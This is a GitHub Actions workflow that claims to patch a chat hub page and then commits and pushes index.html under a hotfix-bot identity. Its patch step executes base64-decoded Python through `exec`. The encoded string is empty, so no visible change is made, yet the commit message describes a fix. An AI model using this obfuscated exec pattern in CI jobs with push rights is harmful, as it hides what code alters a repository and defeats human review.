name: PAIRA v19.4 chat hub fix

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/paira-v19-4-chat-hub.yml'

permissions:
  contents: write

jobs:
  patch-index:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Patch chat hub
        shell: bash
        run: |
          python -c "import base64;exec(base64.b64decode('').decode('utf-8'))"

      - name: Commit chat fix
        shell: bash
        run: |
          git config user.name "PAIRA Hotfix Bot"
          git config user.email "actions@users.noreply.github.com"
          git add index.html
          git commit -m "Fix chat hub and remove stale demo room"
          git push
